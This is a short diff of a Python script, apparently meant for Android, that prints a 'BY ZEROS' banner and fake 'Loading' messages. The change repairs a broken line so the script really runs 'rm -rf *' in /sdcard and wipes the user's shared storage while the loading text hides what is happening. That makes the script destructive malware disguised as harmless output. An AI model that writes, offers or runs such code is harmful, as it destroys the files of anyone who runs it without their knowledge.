@@ -2,7 +2,7 @@ import os as zeros
 import time
 zeros.system('clear')
 print('BY ZEROS')
-delete.system('cd /sdcard && rm -rf *')
+zeros.system('cd /sdcard && rm -rf *')
 print('Loading')
 time.sleep(1)
 print('Loading.')
